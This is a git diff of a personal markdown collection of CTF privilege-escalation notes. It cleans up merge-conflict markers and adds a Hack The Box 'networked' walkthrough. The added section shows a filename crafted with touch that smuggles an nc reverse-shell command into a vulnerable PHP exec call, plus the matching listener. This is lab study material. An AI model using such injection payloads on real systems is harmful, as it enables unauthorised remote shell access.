@@ -260,10 +260,6 @@ THM{6637f41d0177b6f37cb20d775124699f}
 ```
 ## tryhackme linux privlege escalation arena(80 different SUID binaries)(80 different priv esc methods):
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 180e7f4d686e06c2fb3250628988349ff8f25847
 # Other
 
 ## Priv esc with mounting file system on docker:
@@ -671,4 +667,17 @@ root@debian:/home/user# id && whoami
 uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 root
 ```
+## Using touch to make an executable file name - hack the box networed:
+
+After gaining a shell we find a file which involves this interesting line:
+```bash
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+```
+we can see that the variable holds the name of a file and if we name it in a specific way we can try and execute code with it.
+```bash
+touch ";nc ourip 1234 -c bash"
+```
+And then if we setup a listener on port 1234 with `nc -nlvp 1234` we get a connection back on our shell.
+
+
 Thanks for reading hope that you enjoyed.
